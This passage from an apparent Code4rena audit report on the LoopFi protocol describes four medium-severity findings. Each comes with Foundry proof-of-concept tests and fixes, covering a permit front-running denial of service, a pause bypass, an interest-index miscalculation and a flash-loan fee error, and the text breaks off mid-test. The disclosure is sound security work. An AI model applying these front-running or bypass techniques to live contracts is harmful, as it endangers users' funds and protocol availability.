*Submitted by [chaduke](https://github.com/code-423n4/2024-07-loopfi-findings/issues/205), also found by [minglei-wang-3570](https://github.com/code-423n4/2024-07-loopfi-findings/issues/560), [Infect3d](https://github.com/code-423n4/2024-07-loopfi-findings/issues/555), zhaojohnson ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/552), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/442)), 0xINFINITY ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/475), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/332)), [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/392), [0xbepresent](https://github.com/code-423n4/2024-07-loopfi-findings/issues/368), [pks\_](https://github.com/code-423n4/2024-07-loopfi-findings/issues/346), [petarP1998](https://github.com/code-423n4/2024-07-loopfi-findings/issues/294), [Anirruth](https://github.com/code-423n4/2024-07-loopfi-findings/issues/251), and [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/73)*

`SwapAction.transferAndSwap()` will perform a `_transferFrom` to transfer the input tokens to the user proxy and then perform a swap via a router. When it uses an ERC20 permit `transferFrom`, an attacker can extract the `v, r, s` from the `safePermit()` call and frontruns it with a direct `safePermit()` with the same arguments. As a result, `SwapAction.transferAndSwap()` will fail due to the advancing of nonce. Effectively, this is a DOS attack.

### Proof of Concept

First, `SwapAction.transferAndSwap()` will perform a `_transferFrom` to transfer the input tokens to the user proxy and then perform a swap via a router.

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/SwapAction.sol#L93C14-L103>

Second, `_transferFrom` has three cases: `permit2`, `permit` or standard `transferFrom`:

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/TransferAction.sol#L46-L82>

The vulnerability lies in the second case, there are two parts:
1. Call `token.safePermit()`;
2. Call `token.safeTransferFrom`.

The first component will set the proper allowance when successful. The problem is that an attacker can observe the mempool and extract the `v, r, s` from the `safePermit()` call and frontruns it with a direct `safePermit()` with the same arguments. As a result, the `_transferFrom` and thus `SwapAction.transferAndSwap()` will fail due to the advancement of the nonce.

[This permit DOS attack](<https://www.trust-security.xyz/post/permission-denied>) has been reported by Immunifi earlier.

The following POC confirms the finding:

1. We simulate the front-running by calling `USDC.SafePermit()` right before the call of `userProxy.execute()`.
2. The result shows we have the right allowance but `SwapAction.transferAndSwap()`  fails due to wrong verification of signature since the nonce has increased by 1.

Run `forge test --match-test testSwapDOS -vv`:

<details>

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console2.sol";

import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {IERC20Permit} from "@openzeppelin/contracts/token/ERC20/extensions/draft-IERC20Permit.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";


import {PRBProxyRegistry} from "prb-proxy/PRBProxyRegistry.sol";
import {PRBProxy} from "prb-proxy/PRBProxy.sol";

import {ISignatureTransfer} from "permit2/interfaces/ISignatureTransfer.sol";

import {IUniswapV3Router, decodeLastToken, UniswapV3Router_decodeLastToken_invalidPath} from "../../vendor/IUniswapV3Router.sol";
import {IVault as IBalancerVault} from "../../vendor/IBalancerVault.sol";

import {PermitMaker} from "../utils/PermitMaker.sol";

import {ApprovalType, PermitParams} from "../../proxy/TransferAction.sol";
import {SwapAction, SwapParams, SwapType, SwapProtocol} from "../../proxy/SwapAction.sol";
import {IPActionAddRemoveLiqV3} from "pendle/interfaces/IPActionAddRemoveLiqV3.sol";



contract SwapActionTest is Test {
    using SafeERC20 for ERC20;
    using SafeERC20 for IERC20Permit;

    SwapAction internal swapAction;

    // user and permit2 related variables
    PRBProxy internal userProxy;
    PRBProxy internal bobProxy;
    uint256 internal userPk;
    address internal user;
    address Bob = makeAddr("Bob");
    uint256 internal constant NONCE = 0;

    // swap protocols
    address internal constant ONE_INCH = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant UNISWAP_V3 = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant PENDLE_ROUTER= 0x00000000005BBB0EF59571E58418F9a4357b68A0;

    // Permit2
    ISignatureTransfer internal constant permit2 = ISignatureTransfer(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    // https://etherscan.io/address/0x000000000022d473030f116ddee9f6b43ac78ba3#code

    // tokens
    ERC20 internal constant DAI = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ERC20 internal constant USDC = ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    ERC20 internal constant WETH = ERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    ERC20 internal constant BOND = ERC20(0x0391D2021f89DC339F60Fff84546EA23E337750f);
    ERC20 internal constant BAL = ERC20(0xba100000625a3754423978a60c9317c58a424e3D);

    // Chainlink oracles
    IPriceFeed internal constant DAI_ETH_FEED = IPriceFeed(0x773616E4d11A78F511299002da57A0a94577F1f4); // DAI:ETH
    IPriceFeed internal constant USDC_ETH_FEED = IPriceFeed(0x986b5E1e1755e3C2440e960477f25201B0a8bbD4); // USDC:ETH
    IPriceFeed internal constant BAL_USD_FEED = IPriceFeed(0xdF2917806E30300537aEB49A7663062F4d1F2b5F); // BAL:USD

    // uni v3
    IUniswapV3Router univ3Router = IUniswapV3Router(UNISWAP_V3);
    bytes internal constant DAI_USDC_PATH = abi.encodePacked(address(DAI), uint24(100), address(USDC));
    bytes internal constant DAI_WETH_BOND_PATH =
        abi.encodePacked(address(DAI), uint24(3000), address(WETH), uint24(3000), address(BOND));
    bytes internal constant DAI_WETH_USDC_PATH =
        abi.encodePacked(address(DAI), uint24(3000), address(WETH), uint24(3000), address(USDC));

    // Balancer
    bytes32 internal constant wethDaiPoolId = 0x0b09dea16768f0799065c475be02919503cb2a3500020000000000000000001a;
    bytes32 internal constant balWethPoolId = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;
    // USDC, DAI, USDT StablePool
    bytes32 internal constant balancerStablePoolId = 0x06df3b2bbb68adc8b0e302443692037ed9f91b42000000000000000000000063;
    IBalancerVault internal constant balancerVault = IBalancerVault(BALANCER_VAULT);

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("mainnet"), 17055414); // 15/04/2023 20:43:00 UTC

        swapAction = new SwapAction(balancerVault, univ3Router, IPActionAddRemoveLiqV3(PENDLE_ROUTER));

        userPk = 0x12341234;
        user = vm.addr(userPk);

        PRBProxyRegistry prbProxyRegistry = new PRBProxyRegistry();                         // 1 
        userProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(user))));
        console2.log("a userProxy has been created for user: ", address(userProxy));

        bobProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(Bob))));
        console2.log("a userProxy has been created for Bob: ", address(bobProxy));

        // set allowance for permit2 transfers
        vm.startPrank(user);
        DAI.approve(address(permit2), type(uint256).max);        // permi2 will verify signature and move funds
        USDC.approve(address(permit2), type(uint256).max);        // everybody gives permit2 approval first, and then enforce security via permit2
        vm.stopPrank();

        vm.startPrank(Bob);
        DAI.approve(address(permit2), type(uint256).max);        // permi2 will verify signature and move funds
        USDC.approve(address(permit2), type(uint256).max);        // everybody gives permit2 approval first, and then enforce security via permit2
        vm.stopPrank();

        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(DAI), "DAI");
        vm.label(address(BOND), "BOND");
        vm.label(address(permit2), "permit2");
        vm.label(address(userProxy), "userProxy");
        vm.label(address(user), "user");
    }

    
    function printBalances(address a, string memory name) public{
        console2.log("\n =================================================");
        console2.log("Balances for ", name);
        console2.log("DAI balance: ", DAI.balanceOf(a));
        console2.log("USDC token balance: ", USDC.balanceOf(a));
        console2.log("BOND token balance: ", BOND.balanceOf(a));
        console2.log("=================================================\n ");
    }

    function testSwapDOS() public {
        console2.log("\n \n swap3---------------------------------------------");   // usdc -> DAI
        uint256 amountOut = 1_000 * 1e18; // amount out of DAI we expect
        uint256 amountInMax = (amountOut * 102) / 100e12; // allow 2% slippage
        deal(address(USDC), user, amountInMax);

        printBalances(user, "user");


        // get permit signature
        uint256 deadline = block.timestamp + 100;
        (uint8 v, bytes32 r, bytes32 s) = PermitMaker.getPermitTransferFromSignature(
            address(USDC),
            address(userProxy),           // spender of the permit
            amountInMax,           // approval amount
            NONCE,
            deadline,
            userPk
        );

        PermitParams memory permitParams = PermitParams({
            approvalType: ApprovalType.PERMIT,
            approvalAmount: amountInMax,
            nonce: NONCE,
            deadline: deadline,
            v: v,
            r: r,
            s: s
        });

        // construct swap params
        SwapParams memory swapParams = SwapParams({
            swapProtocol: SwapProtocol.UNIV3,
            swapType: SwapType.EXACT_OUT,
            assetIn: address(USDC),
            amount: amountOut,
            limit: amountInMax,
            recipient: user,
            deadline: deadline,
            args: DAI_USDC_PATH
        });

        console2.log("user: ", user);
        console2.log("userProxy: ", address(userProxy));
        console2.log("approvalAmount: ", amountInMax);
        console2.log("deadline: ", deadline);

        console2.log("allowance: ", USDC.allowance(user, address(userProxy)));

       
        
        
        console2.log("USDC: ", address(USDC));
        // simulate front-running of calling safePermit()
        IERC20Permit(address(USDC)).safePermit(
                user,
                address(userProxy),  // spender             
                amountInMax,
                deadline,
                v,
                r,
                s
            );

        console2.log("allowance: ", USDC.allowance(user, address(userProxy)));

         
        
        vm.prank(user);
        vm.expectRevert("EIP2612: invalid signature");
        bytes memory response = userProxy.execute(
            address(swapAction),
            abi.encodeWithSelector(swapAction.transferAndSwap.selector, user, permitParams, swapParams)
        );
        // uint256 amountIn = abi.decode(response, (uint256));

    }
}
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Change the logic to either there is sufficient allowance or the `safePermit` succeeds using a try-catch clause:

```diff
function _transferFrom(
        address token,
        address from,
        address to,
        uint256 amount,
        PermitParams memory params
    ) internal {
        if (params.approvalType == ApprovalType.PERMIT2) {
            // Consume a permit2 message and transfer tokens.
            ISignatureTransfer(permit2).permitTransferFrom(
                ISignatureTransfer.PermitTransferFrom({
                    permitted: ISignatureTransfer.TokenPermissions({token: token, amount: params.approvalAmount}),
                    nonce: params.nonce,
                    deadline: params.deadline
                }),
                ISignatureTransfer.SignatureTransferDetails({to: to, requestedAmount: amount}),
                from,
                bytes.concat(params.r, params.s, bytes1(params.v)) // Construct signature
            );
        } else if (params.approvalType == ApprovalType.PERMIT) {
            // Consume a standard ERC20 permit message
            try
IERC20Permit(token).safePermit(
                from,
                to,
                params.approvalAmount,
                params.deadline,
                params.v,
                params.r,
                params.s
            ){}
            catch{
                if(IERC20(token).allowance(from, to) < params.approvalAmount) 
                 revert("not enough allowance");
            }
            IERC20(token).safeTransferFrom(from, to, amount);
        } else {
            // No signature provided, just transfer tokens.
            IERC20(token).safeTransferFrom(from, to, amount);
        }
    }
```

### Assessed type

DoS

**[amarcu (LoopFi) acknowledged and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/205#issuecomment-2400359585):**
 > The transfer action also supports regular transfers, so if a user is constantly getting frontrun we can skip the permit and use the regular allowance/transfer flow. There is no reason to add the fallback mechanism for the allowance check because if we had that in the first place we could skip permits altogether. Also making the allowance mandatory makes permit calls redundant.  

***

## [[M-15] `WhenNotPaused` modifier in the CDPVault can be bypassed by users](https://github.com/code-423n4/2024-07-loopfi-findings/issues/204)
*Submitted by [Kaysoft](https://github.com/code-423n4/2024-07-loopfi-findings/issues/204), also found by Afriauditor ([1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/566), [2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/286)), [chaduke](https://github.com/code-423n4/2024-07-loopfi-findings/issues/551), [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/527), [boraichodrunkenmaster](https://github.com/code-423n4/2024-07-loopfi-findings/issues/525), [ElCid](https://github.com/code-423n4/2024-07-loopfi-findings/issues/505), [Spearmint](https://github.com/code-423n4/2024-07-loopfi-findings/issues/484), [josephxander](https://github.com/code-423n4/2024-07-loopfi-findings/issues/481), [Centaur](https://github.com/code-423n4/2024-07-loopfi-findings/issues/477), [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/459), [Bigsam](https://github.com/code-423n4/2024-07-loopfi-findings/issues/444), [peanuts](https://github.com/code-423n4/2024-07-loopfi-findings/issues/417), [yashar](https://github.com/code-423n4/2024-07-loopfi-findings/issues/375), [Inspecktor](https://github.com/code-423n4/2024-07-loopfi-findings/issues/373), [ak1](https://github.com/code-423n4/2024-07-loopfi-findings/issues/287), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/92), [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/61), [zxriptor](https://github.com/code-423n4/2024-07-loopfi-findings/issues/44), [JanuaryPersimmon2024](https://github.com/code-423n4/2024-07-loopfi-findings/issues/37), and [ustas](https://github.com/code-423n4/2024-07-loopfi-findings/issues/36)*

<https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/CDPVault.sol#L223-L233>

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L239-L249>

### Impact

Users can still execute deposit and withdraw functions when the CDPVault.sol is paused as against the design expectation by just calling the `modifyCollateralAndDebt(...)` function with the necessary parameters.

### Proof of Concept

By design it is expected that when the CDPVault.sol contract is paused by the Dao, the deposits and withdrawals cannot be made due to the `whenNotPaused` modifier on the `deposit` and `withdraw` functions. However, the pause mechanism can be bypassed by users to deposit or withdraw on the CDPVault contract by directly calling the `modifyCollateralAndDebt(...)` function since it is public since it is the same function that is called by the `deposit` and `withdraw` functions.

Both the deposit and withdraw functions of the CDPVault.sol only make simple calculations before calling the public `modifyCollateralAndDebt(...)` function. This allows any user to directly call the `modifyCollateralAndDebt(...)` function when the CDPVault.sol contract is paused.

```solidity
File: CDPVault.sol
function deposit(address to, uint256 amount) external whenNotPaused returns (uint256 tokenAmount) {
        tokenAmount = wdiv(amount, tokenScale);
        int256 deltaCollateral = toInt256(tokenAmount);
@>        modifyCollateralAndDebt({
            owner: to,
            collateralizer: msg.sender,
            creditor: msg.sender,
            deltaCollateral: deltaCollateral,
            deltaDebt: 0
        });
    }

function withdraw(address to, uint256 amount) external whenNotPaused returns (uint256 tokenAmount) {
        tokenAmount = wdiv(amount, tokenScale);
        int256 deltaCollateral = -toInt256(tokenAmount);
@>        modifyCollateralAndDebt({
            owner: to,
            collateralizer: msg.sender,
            creditor: msg.sender,
            deltaCollateral: deltaCollateral,
            deltaDebt: 0
        });
    }

 function modifyCollateralAndDebt(
        address owner,
        address collateralizer,
        address creditor,
        int256 deltaCollateral,
        int256 deltaDebt
    ) public {
...

  }
```

### Recommended Mitigation Steps

Consider implementing either of the two solutions:

1. Make the `modifyCollateralAndDebt(...)` `internal` instead of `public`, or
2. Add the `whenNotPaused` modifier to the `modifyCollateralAndDebt(...)` function.

**[amarcu (LoopFi) confirmed](https://github.com/code-423n4/2024-07-loopfi-findings/issues/204#event-14319031225)**

***

## [[M-16] Incorrect calculation of `newCumulativeIndex` in function `calcDecrease`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/201)
*Submitted by [hearmen](https://github.com/code-423n4/2024-07-loopfi-findings/issues/201), also found by [boraichodrunkenmaster](https://github.com/code-423n4/2024-07-loopfi-findings/issues/496), [emerald7017](https://github.com/code-423n4/2024-07-loopfi-findings/issues/495), [chaduke](https://github.com/code-423n4/2024-07-loopfi-findings/issues/480), [0xBugSlayer](https://github.com/code-423n4/2024-07-loopfi-findings/issues/422), [thisvishalsingh](https://github.com/code-423n4/2024-07-loopfi-findings/issues/379), [joaovwfreire](https://github.com/code-423n4/2024-07-loopfi-findings/issues/326), [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/318), [Chinmay](https://github.com/code-423n4/2024-07-loopfi-findings/issues/259), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/100), and [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/56)*

In the contract `CDPVault.sol`, the function `calcDecrease` calculates `newCumulativeIndex` in line 703 when `amountToRepay < interestAccrued` with `profit` which is:

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L703>

```solidity
                    newCumulativeIndex =
                    (INDEX_PRECISION * cumulativeIndexNow * cumulativeIndexLastUpdate) /
                    (INDEX_PRECISION *
                        cumulativeIndexNow -
                        (INDEX_PRECISION * profit * cumulativeIndexLastUpdate) /
                        debt); // U:[CL-3]
```

However, the `profit` contains the `cumulativeQuotaInterest`, so it can not be used to calculate `newCumulativeIndex`.

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L668>

```solidity
            if (amountToRepay >= cumulativeQuotaInterest) {
                amountToRepay -= cumulativeQuotaInterest; // U:[CL-3]
                profit += cumulativeQuotaInterest; // U:[CL-3]

                newCumulativeQuotaInterest = 0; // U:[CL-3]
            }
```

For example, when the left `amountToRepay` can cover the `interestAccrued`, the `newCumulativeIndex` should be `cumulativeIndexNow` as in line 692, because: `interestAccrued` == `(debt * cumulativeIndexNow) / cumulativeIndexLastUpdate - debt`.

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L692>

```solidity
            if (amountToRepay >= interestAccrued) {
                amountToRepay -= interestAccrued;

                profit += interestAccrued;

                newCumulativeIndex = cumulativeIndexNow;
            }
```

However, when the left `amountToRepay = interestAccrued - 1`, and `profit` will be `cumulativeQuotaInterest+interestAccrued - 1`. The calculation of `newCumulativeIndex` will be larger than `cumulativeIndexNow` because the `cumulativeQuotaInterest+interestAccrued - 1` will be larger than `interestAccrued` which is totally wrong, since it exceeds the limit
`cumulativeIndexNow`.

<https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L703>

```solidity
                    newCumulativeIndex =
                    (INDEX_PRECISION * cumulativeIndexNow * cumulativeIndexLastUpdate) /
                    (INDEX_PRECISION *
                        cumulativeIndexNow -
                        (INDEX_PRECISION * profit * cumulativeIndexLastUpdate) /
                        debt); // U:[CL-3]
```

### Impact

`Position.cumulativeIndexLastUpdate` will be updated with incorrect `newCumulativeIndex` and less interest accrued will be charged from users. The position which should be liquidated will not be liquidated due the the wrong `Position.cumulativeIndexLastUpdate`.

### Proof of Concept

Paste this test in CDPVault.t.sol:

```solidity
    function test_calcDecrese_poc() public {
        //CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 1.0 ether, 0);
        CDPVault vault = createCDPVault(token, 150 ether, 0, 1.25 ether, 1 ether, 0.95 ether);
        createGaugeAndSetGauge(address(vault));

        // create position
        token.mint(address(this), 1000 ether);
        token.approve(address(vault), 100 ether);
        vault.modifyCollateralAndDebt(address(this), address(this), address(this), 100 ether, 70 ether);

        vm.warp(block.timestamp + 865 days);

     

        (, uint256 totalInterest, ) = vault.getDebtInfo(address(this));

        mockWETH.mint(address(this), 500 ether);
        mockWETH.approve(address(vault), 200 ether);
        
        int256 repayAmount = -(int256(totalInterest - 1));

        vault.modifyCollateralAndDebt(address(this), address(this), address(this), 0, repayAmount);
        
        (,,,uint256 cumulativeIndexLastUpdate,, ) = vault.positions(address(this));
        uint256 cumulativeIndexNow = liquidityPool.baseInterestIndex();

        console.log("cumulativeIndexLastUpdate",cumulativeIndexLastUpdate);
        console.log("cumulativeIndexNow",cumulativeIndexNow);


    }
```

The poc result will be:

- `cumulativeIndexLastUpdate 1242341891861284810269427100`
- `cumulativeIndexNow 1239397711761394368218295007`
- `cumulativeIndexLastUpdate>cumulativeIndexNow`

... which is wrong.

### Recommended Mitigation Steps

Use the code as below:

```solidity
            else {
                // If amount is not enough to repay interest, then send all to the stakers and update index
                profit += amountToRepay; // U:[CL-3]
                

                newCumulativeIndex =
                    (INDEX_PRECISION * cumulativeIndexNow * cumulativeIndexLastUpdate) /
                    (INDEX_PRECISION *
                        cumulativeIndexNow -
                        (INDEX_PRECISION * amountToRepay * cumulativeIndexLastUpdate) /
                        debt); // U:[CL-3]

                amountToRepay = 0; // U:[CL-3]
            }
```

#### Assessed type

Other

**[0xtj24 (LoopFi) confirmed and commented](https://github.com/code-423n4/2024-07-loopfi-findings/issues/201#issuecomment-2368510416):**
 > Fixed.

***

## [[M-17] `PositionAction.decreaseLever()` fails to consider the loan fee in Flashlender when calculating `loanAmount`, as a result, the functionality will not work when `protocolFee != 0`](https://github.com/code-423n4/2024-07-loopfi-findings/issues/191)
*Submitted by [chaduke](https://github.com/code-423n4/2024-07-loopfi-findings/issues/191), also found by [0xAlix2](https://github.com/code-423n4/2024-07-loopfi-findings/issues/524), [13u9](https://github.com/code-423n4/2024-07-loopfi-findings/issues/487), [zhaojohnson](https://github.com/code-423n4/2024-07-loopfi-findings/issues/452), [lian886](https://github.com/code-423n4/2024-07-loopfi-findings/issues/427), [lanrebayode77](https://github.com/code-423n4/2024-07-loopfi-findings/issues/407), [Nyx](https://github.com/code-423n4/2024-07-loopfi-findings/issues/380), [0xbepresent](https://github.com/code-423n4/2024-07-loopfi-findings/issues/366), [0xpiken](https://github.com/code-423n4/2024-07-loopfi-findings/issues/313), [0xc0ffEE](https://github.com/code-423n4/2024-07-loopfi-findings/issues/301), [gumgumzum](https://github.com/code-423n4/2024-07-loopfi-findings/issues/122), [hash](https://github.com/code-423n4/2024-07-loopfi-findings/issues/111), [pkqs90](https://github.com/code-423n4/2024-07-loopfi-findings/issues/52), and [nnez](https://github.com/code-423n4/2024-07-loopfi-findings/issues/46)*

`PositionAction.decreaseLever()` allows one to decrease the leverage for a position by doing the following:

1. Perform a `creditFlashLoan` to loan `loanAmount` of underlying tokens;
2. Perform a `modifyCollateralAndDebt` (inside `PositionAction.onCreditFlashLoan()` to reduce the debt of the position by `loanAmount`.
3. Withdraw collateral from the position in the amount of `withdrawnCollateral`.
4. Swap the withdrawn collateral to underlying tokens with the exact output amount of `leverParams.primarySwap.amount = loanAmount + fee` using input collateral in the amount of `swapAmountIn`.
5. The remainng collateral `withdrawnCollateral - swapAmountIn` is either sent to the `residualRecipient` or swap to the specified tokens and sent to the receiver.
6. Return the loan `loanAmount + protocolFee` back to the pool.

The first problem lies in `PositionAction.increaseLever()`: `loanAmount` uses `leverParams.primarySwap.amount`, it does not consider the protocol fee. `leverParams.primarySwap.amount` is the amount of underlying tokens that needs to be swapped out that will be returned back to the pool, which includes the protocol fee. In other words, the correct formula is `loanAmount = leverParams.primarySwap.amount - fee`.

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionAction.sol#L364

Meanwhile, function `positionAction.onCreditFlashLoan()` has a similar problem:

1. `subDebt`, the debt to be reduced from the position should be the same as `loanAmount`, which is  `leverParams.primarySwap.amount - fee`. However, the function uses `leverParams.primarySwap.amount` as `subDebt`, which is wrong.

https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionAction.sol#L444C17-L444C25

In summary, both functions do not consider the impact of `protcolFee`, as a result, these functions will fail.

POC:

1. In `TestBase.sol`, change the following line to make protcolFee = 1%:

```javascript
        flashlender = new Flashlender(IPoolV3(address(liquidityPool)), 0.01 ether); // 1/100 fee
```

2. Run `forge test --match-test testDecreaseLever1 -vv`. (It will revert due to insufficient allowance/balance).

3. When we revised the two functions as follows, everything run smoothly with the correct numbers for all parties.

<details>

```javascript
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/console2.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {PRBProxy} from "prb-proxy/PRBProxy.sol";

import {IntegrationTestBase} from "./IntegrationTestBase.sol";
import {wdiv, WAD} from "../../utils/Math.sol";
import {Permission} from "../../utils/Permission.sol";

import {CDPVault} from "../../CDPVault.sol";

import {PermitParams} from "../../proxy/TransferAction.sol";
import {SwapAction, SwapParams, SwapType, SwapProtocol} from "../../proxy/SwapAction.sol";
import {LeverParams, PositionAction} from "../../proxy/PositionAction.sol";
import {PoolActionParams} from "../../proxy/PoolAction.sol";

import {PositionAction20} from "../../proxy/PositionAction20.sol";

contract PositionAction20_Lever_Test is IntegrationTestBase {
    using SafeERC20 for ERC20;

    // user
    PRBProxy userProxy;
    address user;
    uint256 constant userPk = 0x12341234;
    address Bob = makeAddr("Bob");

    CDPVault vault;

    // actions
    PositionAction20 positionAction;

    // common variables as state variables to help with stack too deep
    PermitParams emptyPermitParams;
    SwapParams emptySwap;
    PoolActionParams emptyPoolActionParams;

    bytes32[] weightedPoolIdArray;

    function setUp() public override {
        super.setUp();

        // configure permissions and system settings
        setGlobalDebtCeiling(15_000_000 ether);

        // deploy vault
        vault = createCDPVault(
            token, // token
            5_000_000 ether, // debt ceiling
            0, // debt floor
            1.25 ether, // liquidation ratio
            1.0 ether, // liquidation penalty
            1.05 ether // liquidation discount
        );
        createGaugeAndSetGauge(address(vault));
        // setup user and userProxy
        user = vm.addr(0x12341234);
        userProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(user))));

        vm.prank(address(userProxy));
        token.approve(address(user), type(uint256).max);
        vm.prank(address(userProxy));
        mockWETH.approve(address(user), type(uint256).max);

        // deploy actions
        positionAction = new PositionAction20(
            address(flashlender),
            address(swapAction),
            address(poolAction),
            address(vaultRegistry)
        );

        // configure oracle spot prices
        oracle.updateSpot(address(token), 1 ether);

        weightedPoolIdArray.push(weightedUnderlierPoolId);

        vm.label(address(userProxy), "UserProxy");
        vm.label(address(user), "User");
        vm.label(address(vault), "CDPVault");
        vm.label(address(positionAction), "PositionAction");
    }


    function printPosition(CDPVault v, address p, string memory name) public{
        console2.log("\n =================================================");
        console2.log("position infor for ", name);

        (uint256 collateral, // [wad]
        uint256 debt, // [wad]
        uint256 lastDebtUpdate, // [timestamp]
        uint256 cumulativeIndexLastUpdate,
        uint192 cumulativeQuotaIndexLU,
        uint128 cumulativeQuotaInterest
        ) = v.positions(p);

        console2.log("collateral: ", collateral);
        console2.log("debt: ", debt);
        console2.log("cumulativeQuotaInterest: ", cumulativeQuotaInterest);
        console2.log("lastUpdate: ", lastDebtUpdate);
        
        console2.log("cumulativeIndexLastUpdate:", cumulativeIndexLastUpdate);
        console2.log("cumulativeQuotaIndexLU: ", cumulativeQuotaIndexLU);
        console2.log("=================================================\n ");
    }

   // simple helper function to increase lever
    function _increaseLever(                // 111111111111111
        PRBProxy proxy,
        CDPVault vault_,
        uint256 upFrontUnderliers,
        uint256 amountToLever,
        uint256 amountToLeverLimit
    ) public returns (uint256 expectedAmountIn) {
        LeverParams memory leverParams;
        {
            address upFrontToken = address(vault_.token());

            address[] memory assets = new address[](2);
            assets[0] = address(underlyingToken);
            assets[1] = address(upFrontToken);

            // mint directly to swap actions for simplicity
            if (upFrontUnderliers > 0) deal(upFrontToken, address(proxy), upFrontUnderliers);  // upfront collateral 

            leverParams = LeverParams({
                position: address(proxy),
                vault: address(vault_),
                collateralToken: address(vault_.token()),
                primarySwap: SwapParams({
                    swapProtocol: SwapProtocol.BALANCER,
                    swapType: SwapType.EXACT_IN,
                    assetIn: address(underlyingToken),
                    amount: amountToLever, // amount of stablecoin to swap in             // amount of flashload undelrying tokens
                    limit: amountToLeverLimit, // min amount of tokens to receive         // amount of flashloaded colalteral limit
                    recipient: address(positionAction),
                    deadline: block.timestamp + 100,
                    args: abi.encode(weightedPoolIdArray, assets)
                }),
                auxSwap: emptySwap, // no aux swap
                auxAction: emptyPoolActionParams
            });

            expectedAmountIn = _simulateBalancerSwap(leverParams.primarySwap);
        }

        vm.startPrank(proxy.owner());
        proxy.execute(
            address(positionAction),
            abi.encodeWithSelector(
                positionAction.increaseLever.selector,
                leverParams,
                address(vault_.token()),
                upFrontUnderliers,
                address(proxy),
                emptyPermitParams
            )
        );
        vm.stopPrank();
    }

function testDecreaseLever1() public {      // 22222222222222222222222
        // create 1st position (this is the user that will lever up the other users position)
        address bob = user;
        PRBProxy bobProxy = userProxy;

        // create 2nd position. This is the user that will be levered up by bob
        address alice = vm.addr(0x56785678);
        PRBProxy aliceProxy = PRBProxy(payable(address(prbProxyRegistry.deployFor(alice))));

        // create alice's initial position
        _increaseLever(
            aliceProxy,
            vault,
            20_000 ether, // upFrontUnderliers
            40_000 ether, // borrowAmount
            39_000 ether // amountOutMin
        );
        (uint256 initialCollateral, uint256 initialNormalDebt, , , , ) = vault.positions(address(aliceProxy));

        printPosition(vault, address(aliceProxy), "AliceProxy"); // 79,000 / 40,000

        uint256 amountOut = 5_000 ether;       // this is the loan + fee
        uint256 maxAmountIn = 5_100 ether;
        LeverParams memory leverParams;
        {
            // now decrease alice's leverage as bob
            address[] memory assets = new address[](2);
            assets[0] = address(underlyingToken);
            assets[1] = address(token);

            leverParams = LeverParams({
                position: address(aliceProxy),
                vault: address(vault),
                collateralToken: address(token),
                primarySwap: SwapParams({
                    swapProtocol: SwapProtocol.BALANCER,
                    swapType: SwapType.EXACT_OUT,
                    assetIn: address(token),             // swap collteral tokens for underlying toksn to return back to flashCreditloan
                    amount: amountOut,                  // ????
                    limit: maxAmountIn,
                    recipient: address(positionAction),
                    deadline: block.timestamp + 100,
                    args: abi.encode(weightedPoolIdArray, assets)
                }),
                auxSwap: emptySwap,
                auxAction: emptyPoolActionParams
            });
        }


        // call setPermissionAgent as alice to allow bob to modify alice's position
        vm.prank(address(aliceProxy));
